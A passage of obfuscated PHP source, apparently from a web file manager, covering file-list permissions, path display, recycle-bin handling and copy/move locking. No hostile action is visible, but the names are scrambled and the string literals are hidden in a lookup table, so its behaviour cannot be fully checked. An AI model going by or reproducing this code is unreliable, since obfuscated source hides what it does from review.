AuthModel::authCheckEdit($‘ş’ÈĞ[$ÎÊˆÒ Æ[487]][$ÎÊˆÒ Æ[488]]); $‘ş’ÈĞ[$ÎÊˆÒ Æ[232]] = AuthModel::authCheckView($‘ş’ÈĞ[$ÎÊˆÒ Æ[487]][$ÎÊˆÒ Æ[488]]); } $this->groupPathDisplay($‘ş’ÈĞ); } unset($‘ş’ÈĞ); } public function _listAppendAuthSecret(&$‘¯à÷’È) { $ï€„ÅÀÈ =& $_SERVER[¦»×‡Ãã]; if (Model($ï€„ÅÀÈ[508])->get($ï€„ÅÀÈ[570]) != $ï€„ÅÀÈ[91]) { return; } static $ª÷Ï™Ë¶ = false; if (!$ª÷Ï™Ë¶) { $çìØû¾Ğ = Model($ï€„ÅÀÈ[571]); $ƒäƒ•Ìß = Model($ï€„ÅÀÈ[572]); $ª÷Ï™Ë¶ = $ƒäƒ•Ìß->listData(); $ª÷Ï™Ë¶ = array_to_keyvalue($ª÷Ï™Ë¶, $ï€„ÅÀÈ[193]); $ÖÛéïÙš = json_decode(Model($ï€„ÅÀÈ[508])->get($ï€„ÅÀÈ[573]), !0); $ÖÛéïÙš = array_to_keyvalue($ÖÛéïÙš, $ï€„ÅÀÈ[475]); foreach ($ª÷Ï™Ë¶ as $õë¼´íï => $ËñŞôİå) { $ëÓæŠù = $ÖÛéïÙš[$ËñŞôİå[$ï€„ÅÀÈ[574]]]; if (!$ëÓæŠù) { $ƒäƒ•Ìß->remove($ËñŞôİå[$ï€„ÅÀÈ[475]]); unset($ª÷Ï™Ë¶[$õë¼´íï]); continue; } $òÍ÷°‡¯ = $çìØû¾Ğ->listData($ëÓæŠù[$ï€„ÅÀÈ[487]]); if (!$òÍ÷°‡¯) { $ƒäƒ•Ìß->remove($ËñŞôİå[$ï€„ÅÀÈ[475]]); unset($ª÷Ï™Ë¶[$õë¼´íï]); continue; } $ËñŞôİå[$ï€„ÅÀÈ[487]] = $òÍ÷°‡¯; $ËñŞôİå[$ï€„ÅÀÈ[575]] = $ëÓæŠù; $ËñŞôİå[$ï€„ÅÀÈ[576]] = Model($ï€„ÅÀÈ[577])->getInfoSimpleOuter($ËñŞôİå[$ï€„ÅÀÈ[527]]); $ª÷Ï™Ë¶[$õë¼´íï] = $ËñŞôİå; } } $¢Ê —¯Á = USER_ID; $Ï÷È©û = array(); $è§ñˆ„· = $this->_listAppendPath($Ï÷È©û, !0); foreach ($‘¯à÷’È as $õë¼´íï => &$ËñŞôİå) { if (!is_array($ËñŞôİå[$ï€„ÅÀÈ[487]])) { continue; } if ($ËñŞôİå[$ï€„ÅÀÈ[190]] != $ï€„ÅÀÈ[578]) { continue; } if (isset($ª÷Ï™Ë¶[$ËñŞôİå[$ï€„ÅÀÈ[193]]])) { $á–³ıŸ‚ = $ª÷Ï™Ë¶[$ËñŞôİå[$ï€„ÅÀÈ[193]]]; if (!is_array($ËñŞôİå[$ï€„ÅÀÈ[539]])) { $ËñŞôİå[$ï€„ÅÀÈ[539]] = array(); } $ËñŞôİå[$ï€„ÅÀÈ[539]][$ï€„ÅÀÈ[579]] = $á–³ıŸ‚[$ï€„ÅÀÈ[574]]; $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[580]] = $á–³ıŸ‚; $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[581]] = $ËñŞôİå[$ï€„ÅÀÈ[582]]; $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[583]] = $ï€„ÅÀÈ[91]; if ($á–³ıŸ‚[$ï€„ÅÀÈ[527]] != $¢Ê —¯Á) { $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[488]] = $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[488]] & $á–³ıŸ‚[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[487]]; } continue; } $¼•àÁß = $this->parentLevelArray($ËñŞôİå[$ï€„ÅÀÈ[584]]); $ï–€¼‰ = array_reverse($¼•àÁß); foreach ($ï–€¼‰ as $íÅëçÒï => $——¶¹) { if (!isset($ª÷Ï™Ë¶[$——¶¹])) { continue; } $á–³ıŸ‚ = $ª÷Ï™Ë¶[$——¶¹]; $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[580]] = $á–³ıŸ‚; if ($á–³ıŸ‚[$ï€„ÅÀÈ[527]] != $¢Ê —¯Á) { $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[488]] = $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[488]] & $á–³ıŸ‚[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[487]]; } $£á´İĞÄ = $ï€„ÅÀÈ[12]; $áÔè£Ûã = count($¼•àÁß) - $íÅëçÒï; for ($µÓşÇŠ = 0; $µÓşÇŠ < $áÔè£Ûã; $µÓşÇŠ++) { if (!isset($è§ñˆ„·[$¼•àÁß[$µÓşÇŠ]])) { $£á´İĞÄ = $ï€„ÅÀÈ[12]; break; } $£á´İĞÄ = $£á´İĞÄ . rtrim($è§ñˆ„·[$¼•àÁß[$µÓşÇŠ]], $ï€„ÅÀÈ[8]) . $ï€„ÅÀÈ[8]; } $ËñŞôİå[$ï€„ÅÀÈ[487]][$ï€„ÅÀÈ[581]] = rtrim($£á´İĞÄ, $ï€„ÅÀÈ[8]) . $ï€„ÅÀÈ[8]; break; } } unset($ËñŞôİå); } public function groupPathDisplay(&$§ï—Åá·) { $±û¯õÙÒ =& $_SERVER[¦»×‡Ãã]; if ($§ï—Åá·[$±û¯õÙÒ[190]] != self::TYPE_GROUP) { return; } $ä¤òÇì = Model($±û¯õÙÒ[585])->getInfo($§ï—Åá·[$±û¯õÙÒ[569]]); $¡ŸâÒ¼” = $this->parentLevelArray($ä¤òÇì[$±û¯õÙÒ[584]]); $³ÉÉÊøÊ = $±û¯õÙÒ[12]; foreach ($¡ŸâÒ¼” as $°óèà‡À) { $¬ù¢Õ‚Î = Model($±û¯õÙÒ[585])->getInfo($°óèà‡À); $³ÉÉÊøÊ .= $¬ù¢Õ‚Î[$±û¯õÙÒ[90]][$±û¯õÙÒ[193]] . $±û¯õÙÒ[50]; } $§ï—Åá·[$±û¯õÙÒ[586]] = $ä¤òÇì[$±û¯õÙÒ[192]]; $§ï—Åá·[$±û¯õÙÒ[587]] = $ä¤òÇì[$±û¯õÙÒ[584]]; $§ï—Åá·[$±û¯õÙÒ[588]] = $ä¤òÇì[$±û¯õÙÒ[589]]; $§ï—Åá·[$±û¯õÙÒ[590]] = $³ÉÉÊøÊ . $ä¤òÇì[$±û¯õÙÒ[90]][$±û¯õÙÒ[193]]; } protected function _listAppendPath(&$“ï•¥òñ, $³¢Í³ñ‡ = false) { $Ğ½—ŠÛ… =& $_SERVER[¦»×‡Ãã]; static $ì€ë¯åê = array(); $³ïÑ½ö¤ = array(); $œĞŞ…Ùì = array(); if ($³¢Í³ñ‡) { return $ì€ë¯åê; } foreach ($“ï•¥òñ as &$ÜäÍîß³) { $Ò¦¨¹‘ˆ = $ÜäÍîß³[$Ğ½—ŠÛ…[193]]; if ($ÜäÍîß³[$Ğ½—ŠÛ…[485]] == $Ğ½—ŠÛ…[91] && $ÜäÍîß³[$Ğ½—ŠÛ…[192]] != 0) { $ì€ë¯åê[$Ò¦¨¹‘ˆ] = $ÜäÍîß³[$Ğ½—ŠÛ…[32]]; } if ($ÜäÍîß³[$Ğ½—ŠÛ…[485]] == $Ğ½—ŠÛ…[91] && $ÜäÍîß³[$Ğ½—ŠÛ…[192]] == 0) { $ì€ë¯åê[$Ò¦¨¹‘ˆ] = $this->_listAppendPathRoot($ÜäÍîß³, array()); } if (isset($œĞŞ…Ùì[$ÜäÍîß³[$Ğ½—ŠÛ…[584]]])) { continue; } $œĞŞ…Ùì[$ÜäÍîß³[$Ğ½—ŠÛ…[584]]] = !0; $’øÅİ = $this->parentLevelArray($ÜäÍîß³[$Ğ½—ŠÛ…[584]]); foreach ($’øÅİ as $‘·¨ªÑ÷ => $³öø†¤÷) { if (isset($ì€ë¯åê[$³öø†¤÷])) { continue; } if ($‘·¨ªÑ÷ == 0) { $ì€ë¯åê[$³öø†¤÷] = $this->_listAppendPathRoot($ÜäÍîß³, $’øÅİ); } if ($‘·¨ªÑ÷ != 0) { $³ïÑ½ö¤[] = $³öø†¤÷; } } } unset($ÜäÍîß³); $³ïÑ½ö¤ = array_unique($³ïÑ½ö¤); if (count($³ïÑ½ö¤) > 0) { $ş³áÁç× = array($Ğ½—ŠÛ…[491] => array($Ğ½—ŠÛ…[492], $³ïÑ½ö¤)); if (count($³ïÑ½ö¤) == 1) { $Şàáş¿à = $this->sourceInfo($³ïÑ½ö¤[0]); $ÅÔ«öí´ = is_array($Şàáş¿à) ? array($Şàáş¿à) : !1; } else { $ÅÔ«öí´ = $this->field($Ğ½—ŠÛ…[591])->where($ş³áÁç×)->select(); } if (!$ÅÔ«öí´) { $ÅÔ«öí´ = array(); } foreach ($ÅÔ«öí´ as $¤ØÂåïş) { $ì€ë¯åê[$¤ØÂåïş[$Ğ½—ŠÛ…[193]]] = $¤ØÂåïş[$Ğ½—ŠÛ…[32]]; } } $Ã³Øéøã = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ßş¿åºş = array(); foreach ($“ï•¥òñ as &$ÜäÍîß³) { $ø›ŞıêÒ = $ÜäÍîß³[$Ğ½—ŠÛ…[584]]; $—â¢óì¬ = $Ğ½—ŠÛ…[12]; if (isset($ßş¿åºş[$ø›ŞıêÒ])) { $—â¢óì¬ = $ßş¿åºş[$ø›ŞıêÒ]; } else { $’øÅİ = $this->parentLevelArray($ÜäÍîß³[$Ğ½—ŠÛ…[584]]); foreach ($’øÅİ as $‘·¨ªÑ÷ => $³öø†¤÷) { if (isset($ì€ë¯åê[$³öø†¤÷])) { $—â¢óì¬ .= $ì€ë¯åê[$³öø†¤÷] . $Ğ½—ŠÛ…[8]; } } $ßş¿åºş[$ø›ŞıêÒ] = $—â¢óì¬; } $—â¢óì¬ .= $ÜäÍîß³[$Ğ½—ŠÛ…[32]]; if ($ÜäÍîß³[$Ğ½—ŠÛ…[485]] == $Ğ½—ŠÛ…[91]) { $—â¢óì¬ .= $Ğ½—ŠÛ…[8]; } $ÜäÍîß³[$Ğ½—ŠÛ…[582]] = str_replace($Ğ½—ŠÛ…[592], $Ğ½—ŠÛ…[8], $—â¢óì¬); if ($ÜäÍîß³[$Ğ½—ŠÛ…[192]] == $Ğ½—ŠÛ…[228]) { $ÜäÍîß³[$Ğ½—ŠÛ…[32]] = trim($ì€ë¯åê[$ÜäÍîß³[$Ğ½—ŠÛ…[193]]], $Ğ½—ŠÛ…[8]); $ÜäÍîß³[$Ğ½—ŠÛ…[582]] = $ÜäÍîß³[$Ğ½—ŠÛ…[32]] . $Ğ½—ŠÛ…[8]; } if (intval($ÜäÍîß³[$Ğ½—ŠÛ…[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÜäÍîß³, $’øÅİ, $Ã³Øéøã); } } unset($ÜäÍîß³); return $“ï•¥òñ; } private function _listAppendPathRecycle(&$§£îå…¬, $µ¹ı÷, $úÃÅÁƒğ) { $ˆ¤Ÿ«çÓ =& $_SERVER[¦»×‡Ãã]; if (!in_array($úÃÅÁƒğ, $µ¹ı÷) && $§£îå…¬[$ˆ¤Ÿ«çÓ[193]] != $úÃÅÁƒğ) { return; } $ÀËäÍèĞ = explode($ˆ¤Ÿ«çÓ[8], trim($§£îå…¬[$ˆ¤Ÿ«çÓ[582]], $ˆ¤Ÿ«çÓ[8])); $³ÀÖøÊ§ = implode($ˆ¤Ÿ«çÓ[8], array_slice($ÀËäÍèĞ, 2)); $§£îå…¬[$ˆ¤Ÿ«çÓ[582]] = $ˆ¤Ÿ«çÓ[8] . LNG($ˆ¤Ÿ«çÓ[593]) . $ˆ¤Ÿ«çÓ[8] . ltrim($³ÀÖøÊ§, $ˆ¤Ÿ«çÓ[8]); $§£îå…¬[$ˆ¤Ÿ«çÓ[584]] = $ˆ¤Ÿ«çÓ[594] . implode($ˆ¤Ÿ«çÓ[50], array_slice($µ¹ı÷, 1)) . $ˆ¤Ÿ«çÓ[50]; if ($§£îå…¬[$ˆ¤Ÿ«çÓ[193]] == $úÃÅÁƒğ) { $§£îå…¬[$ˆ¤Ÿ«çÓ[584]] = $ˆ¤Ÿ«çÓ[594]; $§£îå…¬[$ˆ¤Ÿ«çÓ[192]] = $ˆ¤Ÿ«çÓ[228]; $§£îå…¬[$ˆ¤Ÿ«çÓ[32]] = LNG($ˆ¤Ÿ«çÓ[593]); } $§£îå…¬[$ˆ¤Ÿ«çÓ[595]] = $ˆ¤Ÿ«çÓ[596]; } protected function _listAppendPathRoot(&$ûÑ³¨éÎ, $ú›şÌÕÙ) { $Ğæß¼Ğ— =& $_SERVER[¦»×‡Ãã]; static $õ—ƒ®Õ = false; $´Ó¼Ÿ– = $Ğæß¼Ğ—[12]; if ($ûÑ³¨éÎ[$Ğæß¼Ğ—[190]] == self::TYPE_USER) { if ($ûÑ³¨éÎ[$Ğæß¼Ğ—[569]] == USER_ID) { $´Ó¼Ÿ– = LNG($Ğæß¼Ğ—[597]); if ($õ—ƒ®Õ === !1) { $ìÚåëÊâ = Model($Ğæß¼Ğ—[598])->getInfoFull(USER_ID); $õ—ƒ®Õ = _get($ìÚåëÊâ, $Ğæß¼Ğ—[599], $Ğæß¼Ğ—[12]); } if ($ú›şÌÕÙ && $ú›şÌÕÙ[0] == $õ—ƒ®Õ || !$ú›şÌÕÙ && $ûÑ³¨éÎ[$Ğæß¼Ğ—[193]] == $õ—ƒ®Õ) { $´Ó¼Ÿ– = LNG($Ğæß¼Ğ—[600]); $ûÑ³¨éÎ[$Ğæß¼Ğ—[601]] = $Ğæß¼Ğ—[602]; } if (!$ú›şÌÕÙ) { $ûÑ³¨éÎ[$Ğæß¼Ğ—[32]] = $´Ó¼Ÿ–; } } else { $ûÑ³¨éÎ[$Ğæß¼Ğ—[603]] = Model($Ğæß¼Ğ—[577])->getInfoSimpleOuter($ûÑ³¨éÎ[$Ğæß¼Ğ—[569]]); $´Ó¼Ÿ– = LNG($Ğæß¼Ğ—[604]) . $Ğæß¼Ğ—[176] . $ûÑ³¨éÎ[$Ğæß¼Ğ—[603]][$Ğæß¼Ğ—[32]] . $Ğæß¼Ğ—[178]; } } else { if ($ûÑ³¨éÎ[$Ğæß¼Ğ—[190]] == self::TYPE_GROUP) { $¯œÕ‚‚‡ = Model($Ğæß¼Ğ—[585])->getInfoSimple($ûÑ³¨éÎ[$Ğæß¼Ğ—[569]]); $´Ó¼Ÿ– = $¯œÕ‚‚‡[$Ğæß¼Ğ—[32]]; } else { if ($ûÑ³¨éÎ[$Ğæß¼Ğ—[190]] == self::TYPE_SYSTEM) { $´Ó¼Ÿ– = $Ğæß¼Ğ—[605]; } } } $´Ó¼Ÿ– = $´Ó¼Ÿ– ? $Ğæß¼Ğ—[8] . $´Ó¼Ÿ– . $Ğæß¼Ğ—[8] : $Ğæß¼Ğ—[8]; return $´Ó¼Ÿ–; } protected function _listAppendUser(&$è§°ªÓ˜) { $ ½´¤ˆ =& $_SERVER[¦»×‡Ãã]; $•û²ÛÚª = array_to_keyvalue($è§°ªÓ˜, $ ½´¤ˆ[12], $ ½´¤ˆ[527]); $¤Ï“ßúÈ = array_to_keyvalue($è§°ªÓ˜, $ ½´¤ˆ[12], $ ½´¤ˆ[529]); $÷ÁÆŠ¡ = array_merge($•û²ÛÚª, $¤Ï“ßúÈ); $ĞÌ¹·šŠ = Model($ ½´¤ˆ[598])->userListInfo($÷ÁÆŠ¡); foreach ($è§°ªÓ˜ as &$ÆÍ„ö¡) { $áóÊºà± = $ÆÍ„ö¡[$ ½´¤ˆ[527]]; $ÆÍ„ö¡[$ ½´¤ˆ[527]] = $ĞÌ¹·šŠ[$áóÊºà±] ? $ĞÌ¹·šŠ[$áóÊºà±] : !1; $áóÊºà± = $ÆÍ„ö¡[$ ½´¤ˆ[529]]; $ÆÍ„ö¡[$ ½´¤ˆ[529]] = $ĞÌ¹·šŠ[$áóÊºà±] ? $ĞÌ¹·šŠ[$áóÊºà±] : !1; if (_get($ÆÍ„ö¡, $ ½´¤ˆ[606], 0)) { $Ó¾ºÕšÖ = $GLOBALS[$ ½´¤ˆ[6]][$ ½´¤ˆ[92]][$ ½´¤ˆ[607]]; if ($ÆÍ„ö¡[$ ½´¤ˆ[539]][$ ½´¤ˆ[608]] <= time() - $Ó¾ºÕšÖ) { $this->metaSet($ÆÍ„ö¡[$ ½´¤ˆ[193]], $ ½´¤ˆ[609], null); $this->metaSet($ÆÍ„ö¡[$ ½´¤ˆ[193]], $ ½´¤ˆ[608], null); unset($ÆÍ„ö¡[$ ½´¤ˆ[539]][$ ½´¤ˆ[609]]); continue; } $Ùæ®õ³Ü = $ÆÍ„ö¡[$ ½´¤ˆ[539]][$ ½´¤ˆ[609]]; $ÆÍ„ö¡[$ ½´¤ˆ[539]][$ ½´¤ˆ[610]] = Model($ ½´¤ˆ[598])->getInfoSimpleOuter($Ùæ®õ³Ü); } } unset($ÆÍ„ö¡); } public function parentLevelArray($óºªïüÓ) { $İ¯’Æğ =& $_SERVER[¦»×‡Ãã]; $óºªïüÓ = explode($İ¯’Æğ[50], trim($óºªïüÓ, $İ¯’Æğ[50])); return array_remove_value($óºªïüÓ, $İ¯’Æğ[228]); } public function listAll($·‰ï±Ùú) { $¿…¥Æ¯ =& $_SERVER[¦»×‡Ãã]; $×Û¹Åó¤ = $this->sourceInfo($·‰ï±Ùú); $ŒË¹¬³ = array($¿…¥Æ¯[611] => array($¿…¥Æ¯[612], $×Û¹Åó¤[$¿…¥Æ¯[584]] . $·‰ï±Ùú . $¿…¥Æ¯[613]), $¿…¥Æ¯[614] => 0); $úõ¶Í¿ = $¿…¥Æ¯[615]; $ÒÑ°Ğñ = "\114\x45\106\x54\40\112\x4f\x49\116\40{$this->tablePrefix}\151\x6f\137\146\x69\x6c\145\x20\x66\x69\154\145\x20\157\156\x20\163\x6f\x75\x72\143\145\56\146\x69\x6c\x65\x49\x44\x20\x3d\x20\146\x69\154\x65\56\x66\x69\x6c\x65\x49\x44"; $Ñ¢Ûà…Ü = $this->alias($¿…¥Æ¯[519])->field($úõ¶Í¿)->where($ŒË¹¬³)->join($ÒÑ°Ğñ)->select(); $this->_listAppendAuth($Ñ¢Ûà…Ü); $this->_listAppendUser($Ñ¢Ûà…Ü); $this->_listAppendPath($Ñ¢Ûà…Ü); $Ñ¢Ûà…Ü = array_to_keyvalue($Ñ¢Ûà…Ü, $¿…¥Æ¯[193]); $†à–Ö… = "\57{$×Û¹Åó¤[$¿…¥Æ¯[32]]}\57"; $†à–Ö… = $†à–Ö… == $¿…¥Æ¯[592] ? $¿…¥Æ¯[8] : $†à–Ö…; $¶Ñ°ùÒŸ = array(); foreach ($Ñ¢Ûà…Ü as $æĞœ­È => $Üöë‡œì) { $ç“‹¦î• = $this->parentLevelArray($Üöë‡œì[$¿…¥Æ¯[584]]); array_shift($ç“‹¦î•); $¢Ú«­ı½ = $†à–Ö…; for ($ŞÃûùõ¶ = 0; $ŞÃûùõ¶ < count($ç“‹¦î•); $ŞÃûùõ¶++) { $¢Ú«­ı½ .= $Ñ¢Ûà…Ü[$ç“‹¦î•[$ŞÃûùõ¶]][$¿…¥Æ¯[32]] . $¿…¥Æ¯[8]; } $¢Ú«­ı½ .= $Üöë‡œì[$¿…¥Æ¯[32]]; if ($Üöë‡œì[$¿…¥Æ¯[485]]) { $¢Ú«­ı½ .= $¿…¥Æ¯[8]; } $£Ô´­³• = array($¿…¥Æ¯[495] => str_replace($¿…¥Æ¯[592], $¿…¥Æ¯[8], str_replace($¿…¥Æ¯[592], $¿…¥Æ¯[8], str_replace($¿…¥Æ¯[592], $¿…¥Æ¯[8], $¢Ú«­ı½))), $¿…¥Æ¯[616] => intval($Üöë‡œì[$¿…¥Æ¯[485]]), $¿…¥Æ¯[617] => intval($Üöë‡œì[$¿…¥Æ¯[79]]), $¿…¥Æ¯[88] => intval($Üöë‡œì[$¿…¥Æ¯[88]]), $¿…¥Æ¯[90] => $this->pathInfoFilter($Üöë‡œì)); if (!$£Ô´­³•[$¿…¥Æ¯[485]]) { $£Ô´­³•[$¿…¥Æ¯[541]] = $Üöë‡œì[$¿…¥Æ¯[541]]; } $¶Ñ°ùÒŸ[] = $£Ô´­³•; } $¶Ñ°ùÒŸ = array_sort_by($¶Ñ°ùÒŸ, $¿…¥Æ¯[87]); return $¶Ñ°ùÒŸ; } } goto fµÈ»ğŠâ›; fµÈ»ğŠâ›: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($à»Êòú¨) { $ôÂïì…Ã =& $_SERVER[¦»×‡Ãã]; if (!$this->allowLock()) { return; } $this->_lockCheck($ôÂïì…Ã[618], $à»Êòú¨); $æÇæ®­­ = 1; $this->_lockEvent($à»Êòú¨, array($ôÂïì…Ã[619], $ôÂïì…Ã[620]), $æÇæ®­­); $this->_lockParent($à»Êòú¨, array($ôÂïì…Ã[620]), $æÇæ®­­); $this->_lockEvent($à»Êòú¨, array($ôÂïì…Ã[621], $ôÂïì…Ã[622]), $æÇæ®­­); $this->_lockCheckEnd($ôÂïì…Ã[618], $à»Êòú¨); } public function lockCopyEnd($‡ ô›ø) { $ ä¨È‚¯ =& $_SERVER[¦»×‡Ãã]; if (!$this->allowLock()) { return; } $áÁŸ¦§ı = 0; $this->_lockEvent($‡ ô›ø, array($ ä¨È‚¯[619], $ ä¨È‚¯[620]), $áÁŸ¦§ı); $this->_lockParent($‡ ô›ø, array($ ä¨È‚¯[620]), $áÁŸ¦§ı); $this->_lockEvent($‡ ô›ø, array($ ä¨È‚¯[621], $ ä¨È‚¯[622]), $áÁŸ¦§ı); } public function lockWriteStart($ˆÃªš¥Ê, $â“ù°è = '') { $‘¢çİøî =& $_SERVER[¦»×‡Ãã]; if (!$this->allowLock()) { return; } $this->_lockCheck($‘¢çİøî[619], $ˆÃªš¥Ê); $¨Æô›„® = 1; $this->_lockKey($‘¢çİøî[623] . $ˆÃªš¥Ê . $‘¢çİøî[10] . $â“ù°è, $¨Æô›„®); $this->_lockEvent($ˆÃªš¥Ê, array($‘¢çİøî[618], $‘¢çİøî[620]), $¨Æô›„®); $this->_lockParent($ˆÃªš¥Ê, array($‘¢çİøî[618], $‘¢çİøî[620]), $¨Æô›„®); $this->_lockCheckEnd($‘¢çİøî[619], $ˆÃªš¥Ê); } public function lockWriteEnd($¦º»³Ëò, $ÆñíØò = '') { $©ÈµÖ«Ç =& $_SERVER[¦»×‡Ãã]; if (!$this->allowLock()) { return; } $ßäßç×  = 0; $this->_lockKey($©ÈµÖ«Ç[623] . $¦º»³Ëò . $©ÈµÖ«Ç[10] . $ÆñíØò, $ßäßç× ); $this->_lockEvent($¦º»³Ëò, array($©ÈµÖ«Ç[618], $©ÈµÖ«Ç[620]), $ßäßç× ); $this->_lockParent($¦º»³Ëò, array($©ÈµÖ«Ç[618], $©ÈµÖ«Ç[620]), $ßäßç× ); } public function lockMoveStart($«é‚ ş) { $÷•‹´„´ =& $_SERVER[¦»×‡Ãã]; if (!$this->allowLock()) { return; } $this->_lockCheck($÷•‹´„´[620], $«é‚ ş); $ıŒ¿ÑÛî = 1; $this->_lockKey($÷•‹´„´[624] . $«é‚ ş, $ıŒ¿ÑÛî); $this->_lockEvent($«é‚ ş, array($÷•‹´„´[618], $÷•‹´„´[619]), $ıŒ¿ÑÛî); $this->_lockParent($«é‚ ş, array($÷•‹´„´[618], $÷•‹´„´[620]), $ıŒ¿ÑÛî); $this->_lockEvent($«é‚ ş, array($÷•‹´„´[625], $÷•‹´„´[621], $÷•‹´„´[622]), $ıŒ¿ÑÛî); $this->_lockCheckEnd($÷•‹´„´[620], $«é‚ ş); } public function lockMoveEnd($Á”Ò˜æŸ) { $¹£°Û¼È =& $_SERVER[¦»×‡Ãã]; if (!$this->allowLock()) { return; } $¾ïğŞè = 0; $this->_lockKey($¹£°Û¼È[624] . $Á”Ò˜æŸ, $¾ïğŞè); $this->_lockEvent($Á”Ò˜æŸ, array($¹£°Û¼È[618], $¹£°Û¼È[619]), $¾ïğŞè); $this->_lockParent($Á”Ò˜æŸ, array($¹£°Û¼È[618], $¹£°Û¼È[620]), $¾ïğŞè); $this->_lockEvent($Á”Ò˜æŸ, array($¹£°Û¼È[625], $¹£°Û¼È[621], $¹£°Û¼È[622]), $¾ïğŞè); } private function _lockCheck($”†¦ğ³Ñ, $î°–‰ºú) { $«§¹ù¢ğ =& $_SERVER[¦»×‡Ãã]; $€„Å¹ƒ = $this->sourceInfo($î°–‰ºú); $¬ŸÇßËŠ = $”†¦ğ³Ñ . $«§¹ù¢ğ[10] . $î°–‰ºú; $this->_lockTimeStart[$¬ŸÇßËŠ] = timeFloat(); if (!is_array($€„Å¹ƒ)) { return; } $‘¦›ÛŸ = LNG($«§¹ù¢ğ[626]); CacheLock::setErrorMsg($«§¹ù¢ğ[176] . htmlspecialchars($€„Å¹ƒ[$«§¹ù¢ğ[32]]) . $«§¹ù¢ğ[178] . $‘¦›ÛŸ); $this->_lockKey($¬ŸÇßËŠ, 1); $this->_lockKey($¬ŸÇßËŠ, 0); $Æª÷àíÌ = array_reverse($this->parentLevelArray($€„Å¹ƒ[$«§¹ù¢ğ[584]])); foreach ($Æª÷àíÌ as $åŒè³ãò) { $¬ŸÇßËŠ = $”†¦ğ³Ñ . $«§¹ù¢ğ[627] . $åŒè³ãò; if (CacheLock::lockGet($«§¹ù¢ğ[628] . $¬ŸÇßËŠ)) { $€„Å¹ƒ = $this->sourceInfo($åŒè³ãò); CacheLock::setErrorMsg($«§¹ù¢ğ[176] . htmlspecialchars($€„Å¹ƒ[$«§¹ù¢ğ[32]]) . $«§¹ù¢ğ[178] . $‘¦›ÛŸ); $this->_lockKey($¬ŸÇßËŠ, 1); $this->_lockKey($¬ŸÇßËŠ, 0); } } } private function _lockCheckEnd($¨ÎÎ±ÀÕ, $¹Òà†âç) { $×š‘İñ… =& $_SERVER[¦»×‡Ãã]; $äÍ«¡ôŒ = $¨ÎÎ±ÀÕ . $×š‘İñ…[10] . $¹Òà†âç; CacheLock::setErrorMsg($×š‘İñ…[454]); if (!isset($this->_lockTimeStart[$äÍ«¡ôŒ])) { return; } $ü²Ë³‚ = timeFloat() - $this->_lockTimeStart[$äÍ«¡ôŒ]; unset($this->_lockTimeStart[$äÍ«¡ôŒ]); if ($ü²Ë³‚ > 0.5) { unset(self::$cacheSourceInfo[$×š‘İñ…[533] . $¹Òà†âç]); } $Ë®œ¿Œ“ = $this->sourceInfo($¹Òà†âç); if (!$Ë®œ¿Œ“) { show_json(LNG($×š‘İñ…[108]), !1); } } private function _lockParent($äğµ™õç, $õÎ˜×ì­, $ Äı±ƒí) { if (!$this->autoLockSet) { return; } $„å±›å = $this->sourceInfo($äğµ™õç); if (!is_array($„å±›å)) { return; } $Ó¥½³¸á = array_reverse($this->parentLevelArray($„å±›å[$_SERVER[¦»×‡Ãã][584]])); foreach ($Ó¥½³¸á as $ñÜë‘é) { $this->_lockEvent($ñÜë‘é, $õÎ˜×ì­, $ Äı±ƒí); } } private function _lockEvent($êŒ½×½Ò, $“›÷ªÂ¼, $«ÔúÍƒå) { $ÌÇú¶Û¡ =& $_SERVER[¦»×‡Ãã]; if (!$this->autoLockSet) { return; } foreach ($“›÷ªÂ¼ as $§½ÈÚ“) { $íİ€õñÙ = $§½ÈÚ“ . $ÌÇú¶Û¡[10] . $êŒ½×½Ò; if ($«ÔúÍƒå && CacheLock::lockGet($ÌÇú¶Û¡[628] . $íİ€õñÙ)) { continue; } $this->_lockKey($íİ€õñÙ, $«ÔúÍƒå); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¹Ïîìá, $àé·”²­ = 1) { $åÅ¡ùİû = $_SERVER[¦»×‡Ãã][628] . md5($¹Ïîìá); if ($àé·”²­) { if (isset(self::$_lockItemArr[$åÅ¡ùİû])) { return; } self::$_lockItemArr[$åÅ¡ùİû] = 1; CacheLock::lock($åÅ¡ùİû, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$åÅ¡ùİû])) { return; } unset(self::$_lockItemArr[$åÅ¡ùİû]); CacheLock::unlock($åÅ¡ùİû); } } public function isParentOf($ëŞÁµ, $ƒÄÊÕºã) { $…æ˜Í¦¸ =& $_SERVER[¦»×‡Ãã]; $óÜŠëÆ¶ = $this->sourceInfo($ëŞÁµ); $‡ñè Œ = $this->sourceInfo($ƒÄÊÕºã); $³±Ú®õš = $óÜŠëÆ¶[$…æ˜Í¦¸[584]] . $óÜŠëÆ¶[$…æ˜Í¦¸[193]] . $…æ˜Í¦¸[50]; $”áéØÚä = $‡ñè Œ[$…æ˜Í¦¸[584]] . $‡ñè Œ[$…æ˜Í¦¸[193]] . $…æ˜Í¦¸[50]; $ìŞ©Ç“Â = strpos($”áéØÚä, $³±Ú®õš) === 0; return $ìŞ©Ç“Â; } private $targetIsDelete = 0; public function copy($Ÿìó§±Ğ, $€ˆ÷’Ø¯, $Û€œÚßµ = REPEAT_REPLACE, $ğö¦Ÿæ = '') { $ªˆãÂ =& $_SERVER[¦»×‡Ãã]; $—çÔ÷ Ä = $this->sourceInfo($Ÿìó§±Ğ); $ÁìóÎí÷ = $this->sourceInfo($€ˆ÷’Ø¯); if (!$—çÔ÷ Ä || !$ÁìóÎí÷ || $ÁìóÎí÷[$ªˆãÂ[485]] != $ªˆãÂ[91]) { return !1; } if 